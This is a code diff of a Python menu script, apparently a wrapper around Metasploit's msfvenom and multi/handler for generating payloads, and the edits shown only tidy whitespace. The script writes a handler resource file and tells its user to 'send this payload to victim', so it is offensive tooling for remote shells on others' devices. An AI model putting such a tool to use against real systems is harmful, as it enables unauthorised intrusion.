@@ -60,7 +60,6 @@ try:
 
 99) Back to main menu\n""")
 
-
     def payld():
         print(R+"""
 ************************************************"""+Y+"""
@@ -77,7 +76,6 @@ try:
 
 99) Back to main menu\n""")
 
-
     def linux_payload():
         print(R+"""
 ************************************************"""+Y+"""
@@ -90,27 +88,20 @@ try:
 
 99) Back to main menu\n""")
 
-
     def arch1():
         print(CY+"""Select Architecture -"""+R+"""1)"""+Y+""" x86"""+R+""" 2)"""+Y+""" x64""")
-
     def checkver():
         if sys.version_info[0] < 3:
             print(Y+"Use Python 3 to run this script"+R+"!"+W)
             exit(0)
-    
     def mk():
         if os.path.exists("payload")==False:
             os.system("mkdir payload")
-            
     def check():
         try:
             os.remove('msh.rc')
         except FileNotFoundError:
-            print()
-            
-    # For normal linux users
-    
+            print()     
     pth="/data/data/com.termux/files/usr/bin/bash"
     def check2():
         if os.path.isfile(pth)==False:
@@ -119,8 +110,6 @@ try:
 ************************************************\n************************************************\n"""
 +Y+"\nmsfconsole not found ! Please install Meatsploit-Framework properly and try again :( \n"+W)
                 exit(0)
-
-                
     def cfile(lh,lp,ply):
         f=open("msh.rc","w+")
         l1="use exploit/multi/handler"
@@ -131,9 +120,7 @@ try:
         l6="exploit -j -z"
         f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
         f.close()
-        return
-
-    
+        return    
     def crplyd(lh,lp,ply,osname,ext):
         print(B+"\nGenerating payload..........\n")
         a=random.randint(1,99)
@@ -143,8 +130,6 @@ try:
         print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
         print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
         return
-
-
     def table():
         global ipd
         global adr
@@ -183,8 +168,7 @@ try:
                 table()
         except ValueError:
             print(R+"\nInvalid Choice! Please try again!")
-            table()
-                
+            table()      
     def sel():
         try:
             c=int(input(G+"Select your choice >>"+W+" "))      
@@ -315,15 +299,13 @@ try:
                                 else:
                                     print(R+"\nInvalid Choice! Please try again!")
                                     osi()
-                                    sel1()
-                                
+                                    sel1()                           
                             except ValueError:
                                 print(R+"\nInvalid Choice! Please try again!")
                                 osi()
                                 sel1()
                             osi()
                             sel1()
-
                         elif ch==99:
                             os.system('clear')
                             start()
@@ -477,7 +459,6 @@ try:
                                 print(R+"\nInvalid choice! Please try again\n")
                                 lst()
                                 sel2()
-
                         elif ch==99:
                             check()
                             os.system('clear')
@@ -493,8 +474,7 @@ try:
                         print(R+"\nInvalid input ! Please try again !\n")
                         sel2()
                 lst()
-                sel2()
-                
+                sel2()                
             elif c==3:
                 os.system('clear')
                 print(Y+"\n>>> Launching msfconsole..................\n\n"+W)
@@ -503,14 +483,12 @@ try:
                 start()
                 main()
                 sel()
-                
             elif c==4:
                 check()
                 print(R+"************************************************")
                 print(Y+"\nExit.........! Have a nice day :) ")
                 print(R+"\n------------"+CY+" Code by >> "+G+" Deadpool2000"+R+" ----------------------"+W)
                 print(R+"------------"+CY+" Youtube >> "+G+" https://bit.ly/2HnPZd2"+R+" ------------\n"+W)
-
             else:
                 check()
                 print(R+"\nInvalid choice ! Please try again :(\n")
@@ -545,8 +523,7 @@ try:
                     exit(0)                
                 else:
                     print(R+"\nInvalid choice ! Leaving.......\n"+W)
-                    exit(0)
-                    
+                    exit(0)                    
     checkver()
     start()
     mk()
@@ -554,8 +531,7 @@ try:
     check2()
     ch3()
     main()                
-    sel()
-    
+    sel()  
 except KeyboardInterrupt:
     check()
     print(CY+"""\n
